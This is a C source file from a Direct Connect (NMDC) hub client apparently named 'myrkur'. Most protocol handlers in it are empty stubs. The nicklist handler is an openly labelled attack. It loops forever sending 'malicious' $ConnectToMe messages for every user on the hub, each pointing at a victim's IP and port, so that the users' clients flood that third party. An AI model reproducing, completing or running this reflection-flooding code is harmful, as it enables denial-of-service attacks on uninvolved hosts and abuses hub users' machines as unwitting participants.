/*
 *	src/protocol.c
 */

#include <stdio.h>

#include <string.h>
#include <pcre.h>

#include <myrkur/client.h>
#include <myrkur/protocol.h>

/* $MyINFO $ALL nick description$ $<connection><flag>$mail$share_size$| */
int nmdc_cmd_myinfo(struct client_t *client, const char *param)
{
	return 0;
}

/* $OpList nick$$nick2$$nick3[...]| */
int nmdc_cmd_oplist(struct client_t *client, const char *param)
{
	return 0;
}

/* $NickList nick$$nick2$$nick3[...]| */
int nmdc_cmd_nicklist(struct client_t *client, const char *param)
{
	char *nick = NULL;
	char *copy = NULL;
	char *msg = NULL;

	/* Keep sending $ConnectToMe requests to all users */
	while (1) {
		/* TODO: Add delay? Check for client disconnects? */
		copy = (char *) malloc(strlen(param) + sizeof(char));
		msg = (char *) malloc(1025);

		memset(copy, 0, strlen(param) + sizeof(char));

		strncpy(copy, param, strlen(param));

		printf("Received NickList = '%s'\n", param);

		nick = strtok(copy, "$|");

		while (nick != NULL) {
			printf("Nick = '%s'\n", nick);

			memset(msg, 0, 1024);

			/* malicious $ConnectToMe message */
			strncpy(msg, "$ConnectToMe ", strlen("$ConnectToMe "));
			strncat(msg, nick, strlen(nick));
			strncat(msg, " ", strlen(" "));
			strncat(msg, client->victim->ip, strlen(client->victim->ip));
			strncat(msg, ":", strlen(":"));
			strncat(msg, client->victim->port, strlen(client->victim->port));
			strncat(msg, "|", strlen("|"));
			client_send(client, msg);

			nick = strtok(NULL, "$|");
		}

		free(copy);
		free(msg);
	}

	return 0;
}

/* $Hello user| */
int nmdc_cmd_hello(struct client_t *client, const char *param)
{
	return 0;
}

/* $Hubname name| */
int nmdc_cmd_hubname(struct client_t *client, const char *param)
{
	return 0;
}

/* $Lock lock Pk=pk| */
int nmdc_cmd_lock(struct client_t *client, const char *param)
{
	/* Open DC Hub sends the following message... */

	/* $Lock Sending_key_isn't_necessary,_key_won't_be_checked. Pk=Same_goes_here.| */

	/* Can ignore Lock commands for now... */

	/* TODO: Generate client->key for hubs which require the key */

	return 0;
}

int nmdc_compare(const void *a, const void *b)
{
	return strncmp((char *) a, (char *) b, MAX_CMD_LEN);
}
